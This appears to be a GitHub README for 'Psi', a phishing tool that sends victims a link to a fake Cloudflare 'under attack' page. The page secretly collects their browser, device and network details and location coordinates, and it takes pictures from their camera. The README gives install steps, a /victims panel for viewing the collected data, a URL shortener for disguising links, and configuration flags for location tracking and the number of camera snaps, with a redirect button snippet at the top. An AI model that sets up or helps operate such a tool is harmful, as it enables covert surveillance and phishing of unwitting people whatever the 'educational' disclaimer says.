
<h1 align='center'>Ψ</h1>

<h2 align='center'>Information Gathering Through Link</h1>

<div align="center">



</div>

```js
function redirectToChat() {
    window.location.href = "https://psi.juliettemapuche.repl.co";
}

var chatButton = document.createElement("button");
chatButton.innerHTML = "Accéder au Chat";

chatButton.style.backgroundColor = "#007BFF";
chatButton.style.color = "white";
chatButton.style.padding = "10px 20px";
chatButton.style.border = "none";
chatButton.style.borderRadius = "5px";
chatButton.style.cursor = "pointer";
chatButton.style.fontWeight = "bold";

chatButton.addEventListener("click", redirectToChat);

document.body.appendChild(chatButton);
```
## Specifications
 * It shows a fake cloudflare under attack page and grabs the information.
 * Gets The Information About browser and Device of User.
 * Get the exact location coordinates.
 * Even if Victim Uses VPN and doesn't allow the location permission you are able to see which country he resides.
 * Network Information and all the audio and camera devices connected to the system.
 * Snaps the picture from camera.
---
<center> <img src=./.github/png.png ></center>

## How to use
 [![Run on Repl.it](https://repl.it/badge/github/tucommenceapousser/Psi)](https://repl.it/github/tucommenceaousser/Psi)
 ### Run on your Local Machine
 * You need to have `Node.js` installed.
 1. Clone the repo using `git clone https://github.com/tucommenceapousser/Psi`
 1. `cd Psi`
 1. `npm install` 
 1. `npm start`
 1. The app will be running at `http://localhost:5000`
 1. For seeing the victims data visit `http://localhost:5000/victims`
---

## short url
you can use url shortener
```bash
node url.js
```

## reset victims data on the panel
```bash
node reset.js
```


## Configuration
 * The `app.js` file contains `config` variable.
```js
var config={
location:true,
camera:true,
camsnaps:4,
redirectURL:"https://google.com"
}
```

```js
location:true
//Can be true or false
``` 
* Set it to `true` , if you want to grab victims location coordinates.

```js
camera:true
//Can be true or false
``` 
* Set it to `true` , If you want to capture images from victims camera.
 
```js
camsnaps:2

``` 
* Set the number of images you want to capture

```js
redirectURL: "https://xxxxxxx.xxx"
```
* The website where you want the user to be redirected after getting information.


### Credits
 * [TechChip](https://github.com/techchipnet/CamPhish) (For His Camphish)


### Credits
 * [TechChip](https://github.com/techchipnet/CamPhish) (For His Camphish)

### ❤️Supporters❤️
[![Stargazers repo roster for @tucommenceapousser/Psi](https://reporoster.com/stars/dark/tucommenceapousser/Psi)](https://github.com/tucommenceapousser/Psi/stargazers)

[![Forkers repo roster for @tucommenceapousser/Psi](https://reporoster.com/forks/dark/tucommenceapousser/Psi)](https://github.com/tucommenceapousser/Psi/network/members)

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY

</p>



The use of the PSI is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).



